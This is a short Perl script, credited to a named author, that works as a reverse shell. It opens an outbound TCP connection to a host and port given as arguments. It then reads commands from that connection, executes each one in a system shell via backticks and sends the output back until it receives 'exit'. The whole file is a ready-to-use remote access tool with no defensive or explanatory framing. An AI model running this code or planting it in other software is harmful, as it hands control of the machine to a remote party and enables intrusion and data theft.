#!/usr/bin/perl
#Lars Sommer, lasg@lasg.dk

if (!defined($ARGV[1])) {
	print "Usage: ./scriptname hostname portnumber\r\n";
	exit 1;
}

use IO::Socket;
my $sock=new IO::Socket::INET (Proto=>"tcp", PeerAddr=>"$ARGV[0]", PeerPort=>"$ARGV[1]");
die unless $sock;

print $sock "Logged in\r\n";

while ($cmd ne "exit"){
print $sock "\r\n\$ ";
$cmd=<$sock>;
chomp($cmd);
print $sock `$cmd`;
}

close($sock);

